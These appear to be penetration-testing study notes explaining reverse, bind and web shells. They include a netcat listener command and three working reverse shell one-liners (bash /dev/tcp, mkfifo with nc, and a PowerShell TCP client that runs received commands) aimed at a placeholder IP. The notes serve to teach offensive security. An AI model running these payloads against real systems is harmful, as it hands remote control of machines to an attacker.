- Reverse Shell : Connects back to our system and gives us control through a reverse connection.
- Bind Shell: Waits for us to connect to it and gives us control once we do.
- Web Shell: Communicates through a web server, accepts our commands through HTTP parameters, executes them and prints back the output.

### Reverse Shell

- Most common type of shell
- We start a netcat listener at our machine that listens on a specific port , say 1234
- Then we execute a reverse shell command that connects the remote shell, i.e Bash or PowerShell to our netcat listener, which gives us a reverse connection over the remote system.

###### Netcat Listener

**Syntax:** 

```
nc -nvlp 1234
```

`-n` - Disables DNS resolution  and only connect from/to IPs, to speed up the connection.
`-v` - Verbose mode, so that we know when we receive a connection
`-l `- Listen mode, to wait for a connection to connect to us.

#### Reverse shell command

- Refer to [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) for a comprehensive list of reverse shell commands depending on our compromised target.


###### Some reliable reverse shell commands are given below : 

Code: bash

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```


```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```



### Bind Shell

- Unlike a `Reverse Shell` that connects to us, we will have to connect to it on the `targets'` listening port.
